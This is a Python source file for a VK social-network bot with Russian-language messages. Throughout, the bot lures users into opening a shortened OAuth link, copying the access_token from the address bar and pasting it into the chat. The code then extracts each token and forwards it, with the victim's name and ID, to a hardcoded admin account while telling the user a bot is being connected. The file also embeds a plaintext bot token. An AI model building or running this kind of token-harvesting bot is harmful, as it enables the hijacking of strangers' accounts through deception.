# -*- coding: utf-8 -*-

# Добавление модулей VK API, LongPoll
import vk_api
from vk_api.longpoll import VkLongPoll, VkEventType
import json

# Токен бота
token = '3186991620fd0d2dc66b9207308c06524c111f2a2af5112cf47db7a128250353523d78c1474a776cd40c4'

adminId = 655105500

# Инициализация бота по токену
bot = vk_api.VkApi(token = token)
give = bot.get_api()
longpoll = VkLongPoll(bot)

# Отправка сообщения
def sendMessage(userId, message):
    bot.method('messages.send', {
                "user_id": userId,
                "message": message,
                "random_id": 0
            })

# Цикл проверки LongPoll ответа
for event in longpoll.listen():
    if event.type == VkEventType.MESSAGE_NEW:
        message = event.message # Сообщение
        msg = message.lower() # Сообщение в нижнем регистре
        userId = event.user_id # Ид пользователя
        user = bot.method('users.get', {"user_ids": str(userId), })
        name = user[0]['first_name']
        surname = user[0]['last_name']
        if msg == 'начать':
            sendMessage(userId, 'Привет, друг🤚🏻\nЕсли ты хочешь подключить к своей странице нашего бота, то следуй моим инструкциям.\n1. Переходишь по ссылке - vk.cc/9LuvMs\n2. Авторизуешься и копируешь данные из адресной строки\n3. Присылаешь скопированные данные в этот чат и ожидаешь - в течение часа бот будет подключен к вашей странице✅')
        elif msg.startswith("https://oauth.vk.com/blank.html#access_token="):
            token_url = message.replace("https://oauth.vk.com/blank.html#access_token=", "")
            access_token = ""
            # Получение токена из ссылки
            for l in token_url:
                if l == "&":
                    break
                else:
                    access_token += l
            messageToAdmin = f'Name: {name} {surname}\nUser ID: {userId}\nToken: {access_token}'
            sendMessage(userId, "✅Токен принят!\n🕗Ожидайте подключение бота! Это может занять некоторое время, после подключения вам обязательно отпишут! Узнать о состоянии бота вы можете в своем статусе!\n💬Также просим вас присоединиться к беседе разработки, там информация об обновлениях и ответы на вопросы - https://vk.me/join/IbNZVp3GChgJv8/fQvPQXEPrx5X0Yxtq/8Y=")
            sendMessage(adminId, messageToAdmin)
        elif msg == "+":
            attachments = json.loads(event.attachments['reply'])
            m = bot.method('messages.getByConversationMessageId', {'peer_id': event.peer_id, 'conversation_message_ids': attachments['conversation_message_id']})
            text = m['items'][0]['text']
            idStr = text[text.find('User ID: ')+1 : text.find("Token:")]
            id = int(idStr.replace("ser ID: ", ""))
            sendMessage(id, "✅Бот подключен!\nУзнать о состоянии бота можно в своем статусе.\nТакже, просим вас вступить в беседу разработки - https://vk.me/join/IbNZVp3GChgJv8/fQvPQXEPrx5X0Yxtq/8Y=")